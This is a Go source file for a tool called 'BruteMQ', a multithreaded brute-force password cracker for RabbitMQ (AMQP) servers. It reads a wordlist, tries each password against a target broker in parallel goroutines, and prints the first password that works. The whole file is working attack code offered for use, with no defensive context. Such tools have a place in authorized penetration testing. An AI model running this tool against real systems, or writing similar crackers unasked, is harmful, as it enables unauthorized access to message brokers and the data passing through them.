package lib

import (
	"bufio"
	"fmt"
	"github.com/common-nighthawk/go-figure"
	"github.com/fatih/color"
	amqp_lib "github.com/streadway/amqp"
	"os"
	"sync"
)

type Amqp struct {
	url  string
	user string
}

func (amqp *Amqp) TryPassword(password string) (bool, error) {
	connString := fmt.Sprintf("amqp://%s:%s@%s", amqp.user, password, amqp.url)
	conn, err := amqp_lib.Dial(connString)
	if err != nil {
		return false, err
	}
	defer conn.Close()
	ch, err := conn.Channel()
	if err != nil {
		return false, err
	}
	defer ch.Close()
	conn.ConnectionState()
	return true, nil
}

func printBanner() {
	banner := figure.NewFigure("BruteMQ", "doom", true)
	banner.Print()
	fmt.Println("\nHigh performance RabbitMQ (amqp) Brute Force tool.")
}

func printResult(result string) {
	green := color.New(color.FgGreen).SprintFunc()
	fmt.Printf("\n[%s]Password: %s found!!!", green("*"), result)
}

func Start(url string, user string, passwords string, threads int) error {
	printBanner()
	bf := &Amqp{url: url, user: user}

	info := make(chan string)
	var wg sync.WaitGroup

	for i := 1; i <= threads; i++ {
		wg.Add(1)
		go func(id int, passwords <-chan string) {
			for p := range passwords {
					if check, _ := bf.TryPassword(p); check {
						printResult(p)
						os.Exit(0)
					}
			}
			defer wg.Done()
		}(i, info)
	}

	file, err := os.Open(passwords)
	if err != nil {
		return err
	}

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		info <- scanner.Text()
	}

	close(info)
	wg.Wait()

	err = scanner.Err()
	if err != nil {
		return err
	}

	return nil
}
